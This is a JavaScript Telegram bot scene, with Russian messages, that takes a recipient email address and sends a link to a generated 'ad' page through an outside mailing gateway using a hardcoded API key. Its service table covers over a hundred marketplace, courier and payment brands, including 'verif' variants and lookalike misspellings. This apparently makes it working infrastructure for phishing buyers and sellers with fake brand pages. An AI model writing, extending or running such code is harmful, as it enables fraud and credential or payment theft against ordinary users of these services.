const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");
const { Ad, Service } = require("../database");
const myAd = require("../commands/myCreateAd");
const log = require("../helpers/log");
const axios = require("axios");

const qs = require('qs');

const sendEmail = async (ctx, ad, service, apiKey, sendService) => {
  try {
    const data = {
      api_key: apiKey,
      url: `https://${service.domain}/me/${ad.id}`,
      user_id: ctx.from.id,
      service: sendService[ad.serviceCode],
      email: ctx.scene.state.data.mail,
    };

    if (ad.price) {
      data.price = parseFloat(ad.price);
    }

    const serializedData = qs.stringify(data);

    const response = await axios.post('https://meowgateway.com/email', serializedData, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      timeout: 10000,
    });
if (ctx.tempMessageId && typeof ctx.deleteMessage === 'function') {
  await ctx.deleteMessage(ctx.tempMessageId).catch(() => {});
}

    if (response.status === 200) {
      await ctx.reply('<b>✅ Письмо успешно отправлено на указанный адрес</b>', {
        reply_to_message_id: ctx.message.message_id,
        parse_mode: 'HTML',
      });

      log(
        ctx,
        `📧 <b>Письмо отправлено</b>:\n\n📍 <b>Сервис:</b> ${service.title}\n📬 <b>Почта получателя:</b> ${ctx.scene.state.data.mail}\n🔗 <b>Ссылка:</b> <a href="https://${service.domain}/${ad.id}">Перейти</a>\n\n<i>Meow MAIL</i>`
      );
    } else {
      throw new Error(`Ошибка при отправке письма: ${response.statusText}`);
    }
  } catch (err) {
    if (ctx.tempMessageId && typeof ctx.deleteMessage === 'function') {
  await ctx.deleteMessage(ctx.tempMessageId).catch(() => {});
}

    console.error("Ошибка при отправке письма:", err.message);
    await ctx.reply(
      `<b>❌ Ошибка при отправке письма для сервиса ${service.title}!</b>\n\nСендер: <b>Meow Mail</b>\n\nОшибка: <b>${err.response?.data?.error || err.message || 'Неизвестная ошибка'}</b>\n\n<i>Пожалуйста, перешлите это сообщение разработчику для решения данной проблемы.</i>`,
      { parse_mode: 'HTML',
              reply_to_message_id: ctx.message.message_id,

      }
    );
  }
};



const scene = new WizardScene(
  "sendMailAd9",
  async (ctx) => {
    try {
      await ctx.scene.reply("Введите почту получателя", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {}; // Инициализация state
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      // Захват и валидация почты
      if (ctx.message?.text) {
        ctx.scene.state.data.mail = ctx.message.text;
      } else {
        await ctx.scene.reply("❌ Пожалуйста, введите действительный адрес электронной почты.");
        return; // Оставляем на текущем шаге
      }

      const ad = await Ad.findOne({ where: { id: ctx.scene.state.adId } });
      const service = await Service.findOne({ where: { code: ad.serviceCode } });



      const sendService = {
        fiverr_com: "fiverr_eu",
        fiverr_eu: "fiverr_eu",

        adverts_ie: "adverts_ie",
        agoda_eu: "agoda_eu",
        agodaa_eu: "agodaa_eu",
        airbnb_eu: "airbnb_eu",
        anibis_ch: "anibis_ch",
        aramex_ae: "aramex_ae",
        auspost_au: "auspost_au",
        bahrainpost_bh: "bahrainpost_bh",
        bazaraki_cy: "bazaraki_cy",
        beatstars_eu: "beatstars_eu",
        beebs_fr: "beebs_fr",
        benefit_bh: "benefit_bh",
        blocket_se: "blocket_se",
        booking_eu: "booking_eu",
        bookingred_eu: "bookingred_eu",
        carousell_ph: "carousell_ph",
        correos_es: "correos_es",
        ctt_pt: "ctt_pt",
        dalilee_om: "dalilee_om",
        dao_dk: "dao_dk",
        depop_au: "depop_au",
        depop_com: "depop_com",
        depop_de: "depop_de",
        depop_uk: "depop_uk",
        depop_us: "depop_us",

        dhl_de: "dhl_de",
        dhl_nl: "dhl_nl",
        discogs_eu: "discogs_eu",
        dpd_eu: "dpd_eu",
        dpd_hr: "dpd_hr",
        dpd_sk: "dpd_sk",
        ebaykleinanzeigen_de: "ebaykleinanzeigen_de",
        ebayverif_eu: "ebayverif_eu",
        ebeys_eu: "ebeys_eu",
        ebid_eu: "ebid_eu",
        econt_bg: "econt_bg",
        eliver_ae: "eliver_ae",
        elo_br: "elo_br",
        emiratespost_ae: "emiratespost_ae",
        etsy_de: "etsy_de",
        etsy_eu: "etsy_eu",
        etsyverif_eu: "etsyverif_eu",
        euroexpress_ba: "euroexpress_ba",
        expedia_eu: "expedia_eu",
        fedex_ae: "fedex_ae",
        fedex_ca: "fedex_ca",
        fedex_kw: "fedex_kw",
        fedex_om: "fedex_om",
        fedex_qa: "fedex_qa",
        fedex_tr: "fedex_tr",
        gls_cz: "gls_cz",
        gls_hu: "gls_hu",
        gls_sl: "gls_sl",
        gumtree_au: "gumtree_au",
        gumtree_uk: "gumtree_uk",
        hostelworld_eu: "hostelworld_eu",
        interac_ca: "interac_ca",
        kwpost_kw: "kwpost_kw",
        lalamove_sg: "lalamove_sg",
        lebocoinn_fr: "lebocoinn_fr",
        leboncoin_fr: "leboncoin_fr",
        letgo_tr: "letgo_tr",
        marktplaats_nl: "marktplaats_nl",
        milanuncios_es: "milanuncios_es",
        mzadqatar_qa: "mzadqatar_qa",
        nextdoor_eu: "nextdoor_eu",
        nextdoorverif_eu: "nextdoorverif_eu",
        njuskalo_hr: "njuskalo_hr",
        nooloman_om: "nooloman_om",
        nzpost_nz: "nzpost_nz",
        olx_ro: "olx_ro",
        omanpost_om: "omanpost_om",
        opensooq_kw: "opensooq_kw",
        opensooq_om: "opensooq_om",
        opensooq_sa: "opensooq_sa",
        packeta_sk: "packeta_sk",
        plick_se: "plick_se",
        poshmark_eu: "poshmark_eu",
        posta_ba: "posta_ba",
        postnord_se: "postnord_se",
        qatarpost_qa: "qatarpost_qa",
        quokaverif_de: "quokaverif_de",
        ricardo_ch: "ricardo_ch",
        royalmail_uk: "royalmail_uk",
        service_eu: "service_eu",
        stdibs_eu: "stdibs_eu",
        subito_it: "subito_it",
        swisspost_ch: "swisspost_ch",
        tori_fi: "tori_fi",
        trademe_nz: "trademe_nz",
        tradera_se: "tradera_se",
        travelexpress_cy: "travelexpress_cy",
        vestiairecollective_eu: "vestiairecollective_eu",
        vinted_at: "vinted_at",
        vinted_cz: "vinted_cz",
        vinted_de: "vinted_de",
        vinted_dk: "vinted_dk",
        vinted_es: "vinted_es",
        vinted_fr: "vinted_fr",
        vinted_hu: "vinted_hu",
        vinted_it: "vinted_it",
        vinted_nl: "vinted_nl",
        vinted_pt: "vinted_pt",
        vinted_se: "vinted_se",
        vinted_uk: "vinted_uk",
        vintedverif_pt: "vintedverif_pt",
        wallapop_es: "wallapop_es",
        wallapop_fr: "wallapop_fr",
        wallapop_it: "wallapop_it",
        wallapop_pt: "wallapop_pt",
        whatnot_eu: "whatnot_eu",
        willhaben_at: "willhaben_at",
        yad2_il: "yad2_il",
               poshmark_eu:"poshmark_us"

      };


 const apiKey = "323dc07c-a86e-4839-aca3-911f1f83eb76";
const loadingMsg = await ctx.reply("⏳ Письмо отправляется...");
ctx.scene.state.tempMessageId = loadingMsg.message_id;

      // Клонируем необходимые данные в "облегчённый" miniCtx
   const miniCtx = {
  from: ctx.from,
  message: ctx.message,
  reply: (...args) => ctx.reply(...args),
  deleteMessage: (...args) => ctx.deleteMessage(...args),
  tempMessageId: ctx.scene.state.tempMessageId,
  scene: { state: { data: { ...ctx.scene.state.data } } },
};

setImmediate(() => {
  sendEmail(miniCtx, ad, service, apiKey, sendService).catch(err =>
    console.error("Фоновая ошибка sendEmail:", err.message)
  );
});

      return ctx.scene.leave();
    } catch (err) {
    

      console.error(err);
      await ctx.replyWithHTML(`<b>❌ Ошибка при подготовке письма!</b>\nОшибка сервера: <b>${err.message}</b>`);
      return ctx.scene.leave();
    }
  }
);

scene.leave((ctx) => myAd(ctx, ctx.scene.state.adId));
module.exports = scene;
